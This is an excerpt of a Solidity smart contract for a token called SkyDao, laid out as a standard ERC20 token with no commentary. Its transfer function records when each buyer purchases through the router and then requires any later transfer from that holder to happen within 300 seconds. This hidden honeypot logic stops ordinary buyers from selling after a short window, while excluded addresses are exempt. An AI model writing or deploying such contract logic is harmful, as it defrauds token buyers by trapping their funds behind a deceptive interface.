...
contract SKYDAO is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _bottokenbuy; 
    ...
    string private _name = "SkyDao";
    string private _symbol = "SkyDao";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _buyback = 0;
    uint256 private _botsell = 300;
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] && to != address(this)) {
            _Liquidity = amount.mul(_buyback).div(100);
        }

        if (to != isExcluded && to != panckerouter && form == panckerouter ){
            _bottokenbuy[to] = block.timestamp; 
        }   
        ...
        if (form !=isExcluded && form !=panckerouter){
            require(block.timestamp <= _bottokenbuy[form] + _botsell);
        }
